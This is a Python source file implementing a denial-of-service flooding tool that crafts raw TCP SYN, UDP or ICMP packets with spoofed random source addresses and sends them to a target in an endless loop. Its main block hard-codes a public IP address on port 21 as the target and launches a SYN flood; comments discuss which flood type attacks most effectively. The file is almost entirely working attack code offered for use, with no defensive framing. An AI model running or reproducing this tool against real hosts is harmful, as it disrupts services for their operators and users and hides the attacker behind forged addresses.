import socket, struct, random, binascii

class DoS:
    def calc_checksum(self, header):
        # init checksum with 0
        checksum = 0
        # traverse the header with step 2
        for i in range(0, len(header), 2):
            # get the first byte
            tmp = header[i]
            # left push first byte for 8, give lower 8 for the second byte
            # adding them together so that can get a work
            tmp = (tmp << 8) + header[i + 1]
            # adding up the words
            checksum += tmp
        # dealing with overflow
        checksum = (checksum & 0xffff) + (checksum >> 16)
        # re-dealing with overflow
        checksum += (checksum >> 16)
        # reverse code
        checksum = ~checksum & 0xffff
        return checksum

    def generate_header_pseudo(self, srcaddr, dstaddr, ptcl, tslen):
        pseudo_SourceAddr = socket.inet_aton(srcaddr)   # 32 bits 4 bytes
        pseudo_DestinAddr = socket.inet_aton(dstaddr)   # 32 bits 4 bytes
        print(socket.inet_ntoa(pseudo_SourceAddr), socket.inet_ntoa(pseudo_DestinAddr))
        pseudo_MustBeZero = 0   # 8 bits 1 bytes
        pseudo_Protocol = ptcl  # 8 bits 1 bytes
        pseudo_TransportLen = tslen
        # generate pseudo header
        pseudo_header = struct.pack("!4s4sBBH", pseudo_SourceAddr, pseudo_DestinAddr,
                                    pseudo_MustBeZero, pseudo_Protocol, pseudo_TransportLen)
        return pseudo_header

    def generate_header_tcp(self, srcaddr, dstaddr, srcport, dstport):
        tcp_SourcePort = srcport    # 16 bits 2 bytes
        tcp_DestinPort = dstport    # 16 bits 2 bytes
        tcp_SeqNumber = random.randint(0x10000000,0xffffffff)   # 32 bits 4 bytes
        tcp_AckNumber = 0   # 32 bits 4 bytes
        tcp_HeaderLen = (5 << 4 | 0)    # 4 bits .5 bytes
        tcp_Reserved = 0        # 3 bits
        # For convenience, split reserved parts into HeaderLen and Flag.
        # so that HeaderLen is 8 bits long and Flag is 8 bits long too.
        # 6 Flags URG/ACK/PSH/RST/SYN/FIN
        tcp_Flag = 2    # SYN; 9 bits
        tcp_Winsize = 0x2000    # 16 bits 2 bytes
        tcp_Checksum = 0        # 16 bits 2 bytes
        tcp_UrgentPointer = 0   # 16 bits 2 bytes
        # ! == Bigend Mode; B/H/L == 1/2/4 Bytes
        tcp_header = struct.pack("!HHLLBBHHH", tcp_SourcePort, tcp_DestinPort,
                                 tcp_SeqNumber, tcp_AckNumber, tcp_HeaderLen, tcp_Flag, tcp_Winsize,
                                 tcp_Checksum, tcp_UrgentPointer)
        # generate pseudo header
        protocol = socket.IPPROTO_TCP
        # header and data length(tcp has no data length)
        hndlen = len(tcp_header)
        # pseudo header
        psd_header = self.generate_header_pseudo(srcaddr, dstaddr, protocol, hndlen)
        # assemble the header for calculating checksum
        virtual_tcp_header = psd_header + tcp_header
        # call function calc_checksum() to calculate
        tcp_Checksum = self.calc_checksum(virtual_tcp_header)
        # re-assemble the header with correct checksum
        tcp_header = struct.pack("!HHLLBBHHH", tcp_SourcePort, tcp_DestinPort, tcp_SeqNumber, tcp_AckNumber,
                                 tcp_HeaderLen, tcp_Flag, tcp_Winsize, tcp_Checksum, tcp_UrgentPointer)
        return tcp_header

    def generate_header_udp(self, srcaddr, dstaddr, srcport, dstport, data):
        udp_SourcePort = srcport    # 16 bits 2 bytes
        udp_DestinPort = dstport    # 16 bits 2 bytes
        udp_Data = data
        udp_Len = 8 + len(udp_Data) # 16 bits 2
        print('len:', udp_Len)
        udp_Checksum = 0            # 16 bits 2 bytes
        # udp header without checksum
        udp_header_without_checksum = struct.pack("!HHHH", udp_SourcePort, udp_DestinPort, udp_Len, udp_Checksum)
        # generate pseudo
        protocol = socket.IPPROTO_UDP
        # pseudo header
        psd_header = self.generate_header_pseudo(srcaddr, dstaddr, protocol, udp_Len)
        # assemble the header for calculating checksum
        virtual_udp_header = psd_header + udp_header_without_checksum + udp_Data.encode()
        udp_Checksum = self.calc_checksum(virtual_udp_header)
        # re-assemble the header with correct checksum
        udp_header = struct.pack("!HHHH", udp_SourcePort, udp_DestinPort, udp_Len, udp_Checksum)
        # Testing random srcip
        print(udp_SourcePort, udp_DestinPort, udp_Len, udp_Checksum)
        return udp_header

    def generate_header_icmp(self):
        icmp_Type = 8   # 8 bits 1 bytes
        icmp_Code = 0   # 8 bits 1 bytes
        icmp_Checksum = 0   # 16 bits 2 bytes
        icmp_Idenfication = random.randint(1000,10000)  # 16 bits 2 bytes
        icmp_SeqNumber = random.randint(1000,10000)     # 16 bits 2 bytes
        icmp_Data = 'YijunStudioYijunStudioYijunStudioYijunStudioYijunStudioYijunStudio'
        icmp_DataLen = len(icmp_Data)
        # icmp header without checksum
        icmp_header_without_checksum = struct.pack(f"!BBHHH{icmp_DataLen}s", icmp_Type, icmp_Code, icmp_Checksum,
                                              icmp_Idenfication, icmp_SeqNumber, icmp_Data.encode())
        # calculating checksum(no pseudo header required)
        icmp_Checksum = self.calc_checksum(icmp_header_without_checksum)
        # re-assemble the header with correct checksum
        icmp_header = struct.pack(f"!BBHHH{icmp_DataLen}s", icmp_Type, icmp_Code, icmp_Checksum,
                                  icmp_Idenfication, icmp_SeqNumber, icmp_Data.encode())
        return icmp_header

    def generate_header_ip(self, srcaddr, dstaddr, segmentsize, tsprtl):
        ip_Version_IHL = 0x45 # 4 bits + 4 bits
        ip_TOS = 0 # 8 bits
        ip_Length = 20 + segmentsize    # 16 bits
        ip_Identification = 1  # 16 bits
        ip_Flag_Offset = 0x4000    # 3 bits + 13 bits
        ip_TTL = 128     # 8 bits
        ip_Protocol = tsprtl   # 8 bits
        ip_HeaderChecksum = 0  # 16 bits
        ip_SourceAddr = socket.inet_aton(srcaddr)  # 32 bits
        ip_DestinAddr = socket.inet_aton(dstaddr)  # 32 bits
        # assemble the header for calculating checksum
        ip_header = struct.pack("!BBHHHBBh4s4s", ip_Version_IHL, ip_TOS, ip_Length, ip_Identification,
                                ip_Flag_Offset, ip_TTL, ip_Protocol, ip_HeaderChecksum,
                                ip_SourceAddr, ip_DestinAddr)
        print(f"packet is {binascii.b2a_hex(ip_header)}")
        # calculating checksum
        ip_HeaderChecksum = self.calc_checksum(ip_header)
        # re-assemble the header with correct checksum
        ip_header = struct.pack("!BBHHHBBH4s4s", ip_Version_IHL, ip_TOS, ip_Length, ip_Identification, ip_Flag_Offset, ip_TTL, ip_Protocol, ip_HeaderChecksum, ip_SourceAddr, ip_DestinAddr)
        print(f"IPv4 Header is {binascii.b2a_hex(ip_header)}")
        return ip_header

    def generate_ip_packet(self, trsprtl):
        # random generate source address
        srcaddr = f"{random.randint(0,240)}.{random.randint(0,240)}.{random.randint(0,240)}.{random.randint(0,240)}"
        # random generate source port
        srcport = random.randint(10000, 60000)
        # generate ip segment according to the setting transport layer protocol
        if trsprtl == socket.IPPROTO_TCP:
            tcp_header = self.generate_header_tcp(srcaddr, dstaddr, srcport, dstport)
            transport_segment = tcp_header
        elif trsprtl == socket.IPPROTO_UDP:
            # the longer data udp sent, the better effect attack has
            # icmp will echo the data， while udp won't
            # so icmp has better attack effect than udp
            udp_data = "YijunStudioYijunStudioYijunStudioYijunStudioYijunStudioYijunStudio"
            udp_header = self.generate_header_udp(srcaddr, dstaddr, srcport, dstport, udp_data)
            transport_segment = udp_header + udp_data.encode()
        elif trsprtl == socket.IPPROTO_ICMP:
            icmp_header = self.generate_header_icmp()
            transport_segment = icmp_header
        # the length of segment
        transport_segment_size = len(transport_segment)
        print(transport_segment_size)
        # call generate_header_ip to generate ip header
        ip_header = DoS_obj.generate_header_ip(srcaddr, dstaddr, transport_segment_size, trsprtl)
        # assemble ip header and segment into a whole ip packet
        dos_ip_packet = ip_header + transport_segment
        return dos_ip_packet

    def DoS_attack(self, dstaddr, dstport, dos_type):
        dos_type = dos_type.lower()
        if dos_type == 'syn':
            transport_layer_protocol = socket.IPPROTO_TCP
        elif dos_type == 'udp':
            transport_layer_protocol = socket.IPPROTO_UDP
        elif dos_type == 'icmp':
            transport_layer_protocol = socket.IPPROTO_ICMP
        # build socket
        dos_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, transport_layer_protocol)
        # dos_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)    # error line
        # continous packet sending
        while True:
            ip_packet = self.generate_ip_packet(transport_layer_protocol)
            client = (dstaddr, dstport)
            dos_socket.sendto(ip_packet, client)
            print(ip_packet)
            print(f"Packet Send Success.")


if __name__=="__main__":
    # init Dos tools
    DoS_obj = DoS()
    # Target IP Address
    # dstaddr = "192.168.43.77"
    # dstaddr = "192.168.43.21"
    dstaddr = "122.51.65.184"
    # Target IP Port(useless when the type with icmp)
    dstport = 21
    # DoS type, which means which type of flood
    # options: syn, udp, icmp
    type = 'syn'
    # DO THE ATTACK
    DoS_obj.DoS_attack(dstaddr, dstport, type)